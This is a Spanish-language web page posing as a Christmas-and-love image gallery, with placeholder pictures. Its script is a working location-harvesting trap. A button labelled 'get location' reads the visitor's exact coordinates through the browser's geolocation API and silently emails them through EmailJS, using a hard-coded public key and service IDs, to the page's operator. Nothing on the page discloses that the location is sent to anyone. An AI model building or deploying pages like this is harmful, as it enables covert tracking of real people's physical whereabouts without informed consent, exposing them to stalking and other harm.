<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Navidad y Amor</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f2f2f2;
            color: #333;
        }
        header {
            background-color: #d32f2f;
            color: #fff;
            padding: 20px;
            text-align: center;
        }
        main {
            padding: 20px;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 15px;
        }
        .gallery img {
            width: 100%;
            height: auto;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        footer {
            background-color: #d32f2f;
            color: #fff;
            text-align: center;
            padding: 10px;
            position: fixed;
            bottom: 0;
            width: 100%;
        }
        .location {
            margin-top: 20px;
            text-align: center;
        }
        .location button {
            background-color: #d32f2f;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .location button:hover {
            background-color: #b71c1c;
        }
    </style>
</head>
<body>
    <header>
        <h1>Navidad y Amor</h1>
        <p>Un espacio lleno de imágenes que inspiran el espíritu navideño y el amor.</p>
    </header>
    <main>
        <h2>Galería</h2>
        <div class="gallery">
            <img src="https://via.placeholder.com/250?text=Navidad+1" alt="Decoración navideña 1">
            <img src="https://via.placeholder.com/250?text=Navidad+2" alt="Decoración navideña 2">
            <img src="https://via.placeholder.com/250?text=Navidad+y+Amor" alt="Navidad y Amor">
            <img src="https://via.placeholder.com/250?text=Amor+Navideño" alt="Amor Navideño">
        </div>
        <div class="location">
            <h2>Obtener Coordenadas</h2>
            <button id="getLocation">Obtener ubicación</button>
        </div>
    </main>
    <footer>
        <p>&copy; 2024 Navidad y Amor. Todos los derechos reservados.</p>
    </footer>
    <script>
        emailjs.init("Uf-YRyG4GM8j3YpZP"); // Sustituye con tu Public Key

        document.getElementById('getLocation').addEventListener('click', function () {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitud = position.coords.latitude;
                        const longitud = position.coords.longitude;

                        // Envía las coordenadas por EmailJS
                        emailjs.send("service_lushimk", "template_uodxsum", {
                            latitud: latitud,
                            longitud: longitud,
                        })
                        .then((response) => {
                            console.log("Correo enviado con éxito:", response.status, response.text);
                        })
                        .catch((error) => {
                            console.error("Error al enviar el correo:", error);
                        });
                    },
                    (error) => {
                        console.error("Error obteniendo ubicación:", error);
                    }
                );
            } else {
                alert("La geolocalización no está disponible en este navegador.");
            }
        });
    </script>
</body>
</html>
